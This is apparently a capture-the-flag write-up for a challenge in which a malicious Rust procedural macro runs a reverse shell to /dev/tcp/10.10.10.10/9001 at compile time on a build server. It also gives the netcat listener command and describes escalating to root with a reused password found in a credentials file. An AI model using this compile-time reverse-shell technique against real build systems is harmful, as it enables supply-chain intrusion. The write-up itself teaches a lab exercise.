# Exploit

## Concepts

This exploit uses a Rust compiler feature called "proc macros" (or "procedural macros").

The idea behind these is to allow macro authors to run code at compile-time and generate the code used to substitute the macro invocation dynamically. Generally, these are very useful, but when they come from unsafe sources, they can become harmful and potentially lead to a Remote Code Execution vulnerability.

## What the exploit does

### Phase 1

This exploit is made up of a Rust project that contains one sub-project, called `rev_shell`.

The `rev_shell` subproject declares in its `Cargo.toml` that proc macros are exported by it.
Specifically, the proc macro called `launch_rev_shell` (present in the file `rev_shell/src/lib.rs`) is exported.
That proc macro executes a command at compile-time, which launches a reverse shell.

*Note:* Before using the exploit, you need to change the address from `/dev/tcp/10.10.10.10/9001` to `/dev/tcp/<YOUR_IP>/9001`.

Therefore, when compiling this project, the compilation server will attempt a connection to your computer and, therefore, we need to be able to receive it.
To receive the connection, we need to run netcat in listen mode, in our computer, using `nc -lvnp 9001`.

Now, when the compilation server compiles our exploit, we will gain access in our computer to a shell on the compilation server.

### Phase 2

After having gained access to a shell on the compilation server, we need to find the flag.

By running `find / -name 'flag*'`, we can see that the flag is located under the `/root` folder.
If we try to read the flag using `cat`, we will get a `Permission denied` error. This is because only the root user can read the flag.

So, how do we log in as the root user? We need to find some more hints.

In the home folder of the current user, using the `ls` command, we can see a suspicious file.
That file is called `passwords.txt` and its content is as follows.

```
Google Cloud: rob@sinf.pt rob1989
Facebook: rob.smith@gmail.com rob1989
Slack: rob@sinf.pt (they send code to e-mail)
SINF Website: rob@sinf.pt rob1989
Twitter/X: rob.smith@gmail.com rob1989
```

This is very weird because the same password is used across a multitude of services.
Could this be the root password?

If we run `su` and use `rob1989` as the password, we will see that we get logged in as the root user. Nice!

Now, we can simply run `cat /root/flag.txt` and get the flag `SINFCTF2023{pr0c_m7cr0s_ar3_real1y_us3fu1}`.